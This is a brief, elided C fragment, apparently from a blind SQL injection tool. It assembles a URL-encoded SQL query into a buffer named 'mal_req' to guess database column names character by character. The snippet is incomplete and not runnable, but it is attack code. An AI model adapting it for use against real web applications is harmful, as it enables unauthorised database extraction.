...
bool check_column(const void *ctx) {
    ...
    const char *fmt =
        ...
        "WHERE%%20table_name%%3d%%22%s%%22%%20" // %s = table_name (Literal! Must use %27 single quotes)
    ...
    sprintf(mal_req, fmt, c_ctx->col_to_find, c_ctx->gen_ctx.discovered, c_ctx->gen_ctx.index + 1, c_ctx->gen_ctx.guess);
